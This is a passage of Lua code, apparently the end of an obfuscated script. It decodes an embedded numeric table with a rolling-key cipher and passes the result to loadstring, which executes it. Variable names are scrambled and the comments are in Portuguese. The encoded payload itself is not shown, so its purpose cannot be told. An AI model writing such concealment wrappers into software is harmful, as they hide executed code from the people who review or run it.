    local function VM_lIl0O1l(d, k, m)
        local R_Il00I = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_Il00I, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_Il00I)
    end

    -- Execution Guard
    local F_l1II0 = loadstring(VM_lIl0O1l(B_1I0O0, 51, 5))
    if F_l1II0 then
        F_l1II0(...)
    end
end)(...)
